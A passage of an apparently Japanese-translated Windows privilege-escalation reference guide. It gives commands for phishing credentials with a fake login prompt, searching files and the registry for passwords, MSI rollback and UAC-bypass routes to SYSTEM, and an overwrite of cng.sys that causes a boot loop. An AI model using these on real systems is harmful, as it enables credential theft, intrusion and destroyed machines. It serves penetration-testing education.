$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### ログ
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 認証情報を尋ねる

ユーザーが知っていると思われる場合は、いつでも**ユーザーに自分の認証情報、あるいは別のユーザーの認証情報を入力するよう求める**ことができます（ただし、クライアントに直接**認証情報**を**尋ねる**のは非常に**リスクが高い**ことに注意してください）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **認証情報を含む可能性のあるファイル名**

以前、**パスワード**が**平文**または**Base64**で含まれていた既知のファイル tunngatillugu
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
提案されているすべてのファイルを検索します：
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin 内の Credentials

Credentials が含まれていないか確認するため、Bin も確認してください

複数のプログラムによって保存された **passwords を復元**するには、次を使用できます: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### registry 内

**Credentials が含まれている可能性があるその他の registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**レジストリから openssh キーを抽出する。**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ブラウザーの履歴

**Chrome または Firefox** のパスワードが保存されている dbs を確認する必要があります。\
また、ブラウザーの履歴、ブックマーク、お気に入りも確認してください。そこに**パスワードが**保存されている可能性があります。

ブラウザーからパスワードを抽出するツール:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** は Windows オペレーティングシステムに組み込まれた技術であり、異なる言語で作られたソフトウェアコンポーネント間の**相互通信**を可能にします。各 COM コンポーネントは **class ID (CLSID)** によって**識別**され、各コンポーネントは 1 つ以上のインターフェースを介して機能を公開します。インターフェースは interface ID (IIDs) によって識別されます。

COM クラスとインターフェースは、それぞれレジストリの **HKEY\CLASSES\ROOT\CLSID** と **HKEY\CLASSES\ROOT\Interface** の下に定義されています。このレジストリは、**HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT** をマージして作成されます。

このレジストリの CLSID 内には、子レジストリ **InProcServer32** があります。ここには、**DLL** を指す**デフォルト値**と、**Apartment** (Single-Threaded)、**Free** (Multi-Threaded)、**Both** (Single or Multi)、または **Neutral** (Thread Neutral) になり得る **ThreadingModel** という値が含まれています。

![Browsers History - COM DLL Overwriting: このレジストリの CLSID 内には、DLL を指すデフォルト値と、値を含む子レジストリ InProcServer32 があります...](<../../images/image (729).png>)

基本的に、実行される **DLL のいずれかを上書き**でき、その DLL が別のユーザーによって実行される場合、**権限を昇格**できます。

攻撃者が永続化の仕組みとして COM Hijacking を使用する方法については、以下を確認してください:


{{#ref}}
com-hijacking.md
{{#endref}}

### **ファイルおよびレジストリ内の一般的なパスワード検索**

**ファイルの内容を検索する**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**特定のファイル名を検索**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**レジストリでキー名とパスワードを検索**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### パスワードを検索する Tools

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **は msf** plugin で、victim 内の credentials を検索するすべての metasploit POST module を**自動的に実行**するために私が作成しました。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) は、このページで説明されているパスワードを含むすべてのファイルを自動的に検索します。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) は、system からパスワードを抽出するもう1つの優れた tool です。

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) tool は、データを平文で保存する複数の tool（PuTTY、WinSCP、FileZilla、SuperPuTTY、RDP）の **sessions**、**usernames**、**passwords** を検索します。
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

**SYSTEM として実行されているプロセスが、完全なアクセス権限で新しいプロセス**（`OpenProcess()`）を開いたとします。その同じプロセスが、**メインプロセスのすべてのオープンハンドルを継承する、低い権限の新しいプロセス**（`CreateProcess()`）も作成したとします。\
その後、低い権限のプロセスに対して**完全なアクセス権限**を持っていれば、`OpenProcess()` で作成された特権プロセスへの**オープンハンドル**を取得し、**shellcode を inject**できます。\
**この脆弱性を検出して exploit する方法**の詳細については、[この例](leaked-handle-exploitation.md)を参照してください。\
**異なる権限レベルで継承された、プロセスやスレッドのより多くのオープンハンドル（完全なアクセス権限だけではありません）をテストおよび abuse する方法**については、[**こちらの別の post**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)でより詳しく説明されています。

## Named Pipe Client Impersonation

**pipes** と呼ばれる共有メモリセグメントにより、プロセス間の通信とデータ転送が可能になります。

Windows には **Named Pipes** という機能があり、異なるネットワーク上にある場合でも、関連性のないプロセス間でデータを共有できます。これは **named pipe server** と **named pipe client** という役割を持つ、client/server アーキテクチャに似ています。

**client** が pipe 経由でデータを送信すると、pipe を設定した **server** は、必要な **SeImpersonate** 権限を持っている場合、**client の identity を引き受ける**ことができます。模倣可能な pipe を介して通信する**特権プロセス**を特定できれば、自分で確立した pipe とそのプロセスがやり取りした際に、そのプロセスの identity を引き受けることで、**より高い権限を取得**できる可能性があります。この攻撃の実行方法については、[**こちら**](named-pipe-client-impersonation.md)および[**こちら**](#from-high-integrity-to-system)のガイドを参照してください。

また、次の tool を使用すると、burp のような tool で **named pipe の通信を intercept**できます：[**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)。さらに、次の tool を使用すると、すべての pipe を list および確認して privescs を探せます：[**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony service（TapiSrv）は server mode で `\\pipe\\tapsrv`（MS-TRP）を公開します。remote authenticated client は、mailslot ベースの async event path を abuse して、`ClientAttach` を `NETWORK SERVICE` が書き込み可能な既存ファイルへの任意の **4-byte write** に変換し、その後 Telephony admin 権限を取得して、service として任意の DLL を load できます。完全な flow は次のとおりです。

- `pszDomainUser` に書き込み可能な既存 path を設定して `ClientAttach` を実行する → service は `CreateFileW(..., OPEN_EXISTING)` を介してそのファイルを開き、async event writes に使用します。
- 各 event は、`Initialize` から attacker が制御する `InitContext` をその handle に write します。`LRegisterRequestRecipient`（`Req_Func 61`）で line app を register し、`TRequestMakeCall`（`Req_Func 121`）を trigger し、`GetAsyncEvents`（`Req_Func 0`）で fetch した後、unregister/shutdown して deterministic writes を繰り返します。
- `C:\Windows\TAPI\tsec.ini` の `[TapiAdministrators]` に自分自身を追加して reconnect し、任意の DLL path を指定して `GetUIDllName` を call すると、`NETWORK SERVICE` として `TSPI_providerUIIdentify` が execute されます。

詳細：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## その他

### Windows で実行可能な File Extensions

**[https://filesec.io/](https://filesec.io/)** の page を確認してください。

### Markdown renderer を介した Protocol handler / ShellExecute abuse

`ShellExecuteExW` に forward されたクリック可能な Markdown link は、危険な URI handler（`file:`、`ms-appinstaller:`、または登録済みの任意の scheme）を trigger し、現在の user として attacker が制御する file を execute する可能性があります。詳細：

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **password の Command Line を Monitoring**

user として shell を取得した際、**command line で credentials を渡している** scheduled task やその他の process が実行されている場合があります。以下の script は、2 秒ごとに process の command line を capture し、現在の state と前回の state を比較して、差分があれば出力します。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## processes からの password の窃取

## Low Priv User から NT\AUTHORITY SYSTEM へ (CVE-2019-1388) / UAC Bypass

グラフィカルインターフェース（console または RDP 経由）にアクセスでき、UAC が有効になっている場合、Microsoft Windows の一部のバージョンでは、unprivileged user から terminal や、"NT\AUTHORITY SYSTEM" などの任意の process を実行できます。

これにより、同じ vulnerability を使用して、privileges を escalate し、同時に UAC を bypass できます。さらに、何も install する必要はなく、process 中に使用される binary は Microsoft によって signed and issued されています。

影響を受ける system の一部は次のとおりです：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
この脆弱性をexploitするには、以下の手順を実行する必要があります。
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator Medium から High Integrity Level / UAC Bypass へ

これを読んで **Integrity Levels** について学んでください:


{{#ref}}
integrity-levels.md
{{#endref}}

次に、これを読んで **UAC と UAC bypasses** について学んでください:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename から SYSTEM EoP へ

[**この blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) で説明されている technique と、[**こちらで入手可能な exploit code**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) です。

この attack は基本的に、Windows Installer の rollback feature を悪用して、uninstallation process 中に正規の files を malicious なものに置き換えます。このため attacker は、**malicious MSI installer** を作成する必要があります。これは `C:\Config.Msi` folder を hijack するために使用され、その後、他の MSI packages の uninstallation 中に Windows Installer が rollback files を保存する際に使われます。rollback files には malicious payload が含まれるように変更されています。

要約した technique は次のとおりです:

1. **Stage 1 – Hijack の準備 (`C:\Config.Msi` を空にする)**

- Step 1: MSI を install
- 書き込み可能な folder (`TARGETDIR`) に harmless な file（例: `dummy.txt`）を install する `.msi` を作成します。
- **"UAC Compliant"** として installer を mark し、**non-admin user** が実行できるようにします。
- install 後も file への **handle** を open したままにします。

- Step 2: Uninstall を開始
- 同じ `.msi` を uninstall します。
- Uninstall process が files を `C:\Config.Msi` に移動し、`.rbf` files（rollback backups）へ rename し始めます。
- `GetFinalPathNameByHandle` を使って open された file handle を **poll** し、file が `C:\Config.Msi\<random>.rbf` になったことを検出します。

- Step 3: Custom Syncing
- `.msi` には **custom uninstall action (`SyncOnRbfWritten`)** が含まれており、次の処理を行います:
- `.rbf` が書き込まれたことを signal します。
- その後、別の event を待ってから uninstall を続行します。

- Step 4: `.rbf` の削除を block
- signal を受け取ったら、`FILE_SHARE_DELETE` なしで **`.rbf file を open** します。これにより **削除できなくなります**。
- 次に signal を返して、uninstall を完了できるようにします。
- Windows Installer は `.rbf` の削除に失敗し、すべての contents を削除できないため、`C:\Config.Msi` は削除されません。

- Step 5: `.rbf` を手動で削除
- attacker であるあなたが `.rbf` file を手動で削除します。
- これで **`C:\Config.Msi` は空** になり、hijack の準備が整います。

> この時点で、**SYSTEM-level arbitrary folder delete vulnerability を trigger** して `C:\Config.Msi` を削除します。

2. **Stage 2 – Rollback Scripts を Malicious なものに置き換える**

- Step 6: Weak ACLs を設定して `C:\Config.Msi` を再作成
- `C:\Config.Msi` folder を自分で再作成します。
- **weak DACLs**（例: Everyone:F）を設定し、`WRITE_DAC` を持つ **handle を open** したままにします。

- Step 7: 別の Install を実行
- 次の設定で `.msi` を再度 install します:
- `TARGETDIR`: 書き込み可能な location。
- `ERROROUT`: forced failure を trigger する variable。
- この install は、`.rbs` と `.rbf` を読み取る **rollback** を再度 trigger するために使用します。

- Step 8: `.rbs` を monitor
- `ReadDirectoryChangesW` を使って `C:\Config.Msi` を monitor し、新しい `.rbs` が出現するまで待ちます。
- その filename を取得します。

- Step 9: Rollback 前に Sync
- `.msi` には **custom install action (`SyncBeforeRollback`)** が含まれており、次の処理を行います:
- `.rbs` が作成されたときに event を signal します。
- その後、続行する前に待機します。

- Step 10: Weak ACL を再適用
- `.rbs created` event を受信した後:
- Windows Installer は `C:\Config.Msi` に **strong ACLs** を再適用します。
- しかし、`WRITE_DAC` を持つ handle をまだ保持しているため、再度 **weak ACLs を再適用** できます。

> ACLs は **handle open 時にのみ enforce** されるため、folder への write は引き続き可能です。

- Step 11: Fake `.rbs` と `.rbf` を配置
- `.rbs` file を、Windows に次の処理を指示する **fake rollback script** で overwrite します:
- `.rbf` file（malicious DLL）を **privileged location**（例: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`）へ restore する。
- **malicious SYSTEM-level payload DLL** を含む fake `.rbf` を配置します。

- Step 12: Rollback を trigger
- sync event を signal して installer を再開します。
- **type 19 custom action (`ErrorOut`)** は、既知の point で install を **intentionally fail** させるよう設定されています。
- これにより **rollback が開始** されます。

- Step 13: SYSTEM が DLL を install
- Windows Installer は次の処理を行います:
- malicious な `.rbs` を読み取ります。
- `.rbf` DLL を target location に copy します。
- これで、**SYSTEM が load する path に malicious DLL** が配置されます。

- Final Step: SYSTEM code を execute
- hijack した DLL を load する trusted **auto-elevated binary**（例: `osk.exe`）を実行します。
- **Boom**: code が **SYSTEM として execute** されます。


### Arbitrary File Delete/Move/Rename から SYSTEM EoP へ

主な MSI rollback technique（前述のもの）は、`C:\Config.Msi` のような **entire folder** を削除できることを前提としています。しかし、vulnerability が **arbitrary file deletion** しか許可しない場合はどうでしょうか？

**NTFS internals** を exploit できます。すべての folder には、次の名前の hidden alternate data stream があります:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
このストリームには、フォルダーの **インデックスメタデータ** が格納されています。

したがって、フォルダーの **`::$INDEX_ALLOCATION` ストリームを削除**すると、NTFS はファイルシステムから **フォルダー全体を削除**します。

これは、次のような標準的なファイル削除 API を使用して実行できます：
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API を呼び出しているにもかかわらず、**フォルダー自体が削除されます**。

### フォルダーの内容の削除から SYSTEM EoP へ
primitive で任意のファイル／フォルダーを削除できなくても、**攻撃者が制御するフォルダーの *内容* を削除できる**場合はどうでしょうか？

1. Step 1: 囮フォルダーとファイルをセットアップする
- 作成: `C:\temp\folder1`
- その中に作成: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` に **oplock** を設定する
- 特権プロセスが `file1.txt` を削除しようとすると、oplock により **実行が一時停止します**。
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Step 3: SYSTEM process（例: `SilentCleanup`）をトリガーする
- このプロセスはフォルダー（例: `%TEMP%`）をスキャンし、その内容の削除を試みます。
- `file1.txt` に到達すると、**oplock がトリガーされ**、callback に制御が渡されます。

4. Step 4: oplock callback 内で削除をリダイレクトする

- Option A: `file1.txt` を別の場所へ移動する
- これにより、oplock を破壊せずに `folder1` を空にできます。
- `file1.txt` を直接削除しないでください。oplock が早期に解放されてしまいます。

- Option B: `folder1` を **junction** に変換する:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- オプション C: `\RPC Control` に **symlink** を作成する：
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> これはフォルダーのメタデータを保存する NTFS 内部ストリームを対象とします — これを削除するとフォルダーが削除されます。

5. Step 5: oplock を解放する
- SYSTEM process は処理を続行し、`file1.txt` の削除を試みます。
- しかし、junction + symlink により、実際に削除されるのは次のものです：
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` は SYSTEM によって削除されます。

### 任意のフォルダー作成から永続的な DoS へ

**ファイルを書き込めない**、または**弱い権限を設定できない**場合でも、**SYSTEM/admin として任意のフォルダーを作成できる** primitive を悪用します。

**ファイルではなくフォルダー**を、以下のような**重要な Windows ドライバー**の名前で作成します。
```
C:\Windows\System32\cng.sys
```
- このパスは通常、`cng.sys` kernel-mode driver に対応します。
- **フォルダーとして事前に作成すると**、Windows は起動時に実際の driver をロードできなくなります。
- その後、Windows は起動中に `cng.sys` のロードを試みます。
- フォルダーを検出すると、**実際の driver の解決に失敗し**、**クラッシュするか、起動が停止します**。
- **fallback はなく**、外部からの介入（例：boot repair またはディスクアクセス）なしでは**復旧できません**。

### 特権 log/backup パス + OM symlinks による任意ファイル overwrite / boot DoS

**privileged service** が **writable config** から読み取ったパスに logs/exports を書き込む場合、**Object Manager symlinks + NTFS mount points** によってそのパスをリダイレクトし、**SeCreateSymbolicLinkPrivilege がなくても** privileged write を任意ファイルの overwrite に変換できます。

**Requirements**
- target path を保存する config が attacker によって writable であること（例：`%ProgramData%\...\.ini`）。
- `\RPC Control` への mount point と OM file symlink を作成できること（James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)）。
- そのパスに書き込む privileged operation（log、export、report）。

**Example chain**
1. config を読み取り、privileged log destination を特定します。例：`C:\ProgramData\ICONICS\IcoSetup64.ini` 内の `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt`。
2. admin 権限なしでパスをリダイレクトします。
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. 特権コンポーネントがログを書き込むのを待つ（例: 管理者が「テスト SMS の送信」を実行する）。書き込み先は `C:\Windows\System32\cng.sys` になる。
4. 上書きされた対象を調査し（hex/PE parser）、破損を確認する。再起動すると、Windows が改ざんされた driver path をロードするため、**boot loop DoS** が発生する。これは、特権サービスが write 用に開く保護対象ファイル全般に適用できる。

> `cng.sys` は通常 `C:\Windows\System32\drivers\cng.sys` からロードされるが、`C:\Windows\System32\cng.sys` にコピーが存在する場合、そちらが先に試行される可能性があるため、破損データの信頼できる DoS sink になる。



## **High Integrity から System へ**

### **New service**

すでに High Integrity process 上で実行している場合、**新しい service を作成して実行する**だけで、**SYSTEM への path** は簡単に確立できる場合がある:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary を作成する場合は、それが有効な service であること、または binary が必要な処理を迅速に実行することを確認してください。有効な service でない場合、20 秒後に強制終了されます。

### AlwaysInstallElevated

High Integrity process から、**AlwaysInstallElevated registry entries を有効化**し、_**.msi**_ wrapper を使用して reverse shell を**インストール**できます。\
[関連する registry keys と _.msi_ package のインストール方法についての詳細はこちら。](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**コードは** [**こちらにあります**](seimpersonate-from-high-to-system.md)**。**

### From SeDebug + SeImpersonate to Full Token privileges

これらの token privileges を持っている場合（おそらく、すでに High Integrity process で確認できます）、SeDebug privilege を使用して**ほぼすべての process**（protected processes を除く）を**開き**、その process の**token をコピー**して、その token を使用した**任意の process を作成**できます。\
この technique では通常、**すべての token privileges を持つ SYSTEM として実行されている process を選択**します（_はい、すべての token privileges を持たない SYSTEM processes も存在します_）。\
**提案した technique を実行するコード例は** [**こちらで確認できます**](sedebug-+-seimpersonate-copy-token.md)**。**

### **Named Pipes**

この technique は、`getsystem` で privilege escalation を実行するために meterpreter が使用します。この technique では、**pipe を作成し、その pipe に書き込むための service を作成または悪用**します。その後、**server** は `SeImpersonate` privilege を使用して pipe を作成しているため、pipe client（service）の **token を impersonate** し、SYSTEM privileges を取得できます。\
name pipes について[**詳しく学びたい場合はこちらを読んでください**](#named-pipe-client-impersonation)。\
name pipes を使用して [**high integrity から System に移行する方法の例はこちらを読んでください**](from-high-integrity-to-system-with-name-pipes.md)。

### Dll Hijacking

**SYSTEM として実行されている process** によって**ロード**される **dll を hijack** できれば、その権限で任意の code を実行できます。したがって、Dll Hijacking はこの種の privilege escalation にも有効です。さらに、**dll のロードに使用される folders に write permissions がある**ため、high integrity process から実行する方がはるかに**簡単**です。\
**Dll hijacking について** [**詳しくはこちらで学べます**](dll-hijacking/index.html)**。**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**こちらを参照:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## 追加情報

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations と sensitive files を確認（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 一部の可能な misconfigurations を確認し、情報を収集（**[**こちらを確認**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**）。**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations を確認**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY、WinSCP、SuperPuTTY、FileZilla、RDP に保存された session information を抽出します。local では -Thorough を使用してください。**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager から credentials を抽出します。Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 収集した passwords を domain 全体に対して spray します**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh は PowerShell ADIDNS/LLMNR/mDNS spoofer および man-in-the-middle tool です。**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 基本的な Windows privesc enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- 既知の privesc vulnerabilities を検索（Watson により DEPRECATED）\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- local checks **(Admin rights が必要)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 既知の privesc vulnerabilities を検索（VisualStudio を使用して compile する必要があります）([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations を検索して host を enumerate します（privesc tool というより information gathering tool です）（compile が必要）**(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 多数の softwares から credentials を抽出します（github に precompiled exe があります）**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp の C# port**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration を確認します（github に executable precompiled があります）。推奨しません。Win10 では正常に動作しません。\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 可能な misconfigurations を確認します（python からの exe）。推奨しません。Win10 では正常に動作しません。

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- この post に基づいて作成された tool です（正常に動作するために accesschk への access は必要ありませんが、使用できます）。

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** の output を読み取り、動作する exploits を推奨します（local python）

**Meterpreter**

_multi/recon/local_exploit_suggestor_

正しい version の .NET を使用して project を compile する必要があります（[こちらを参照](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)）。victim host にインストールされている .NET の version を確認するには、次のコマンドを実行します。
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 参考資料

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
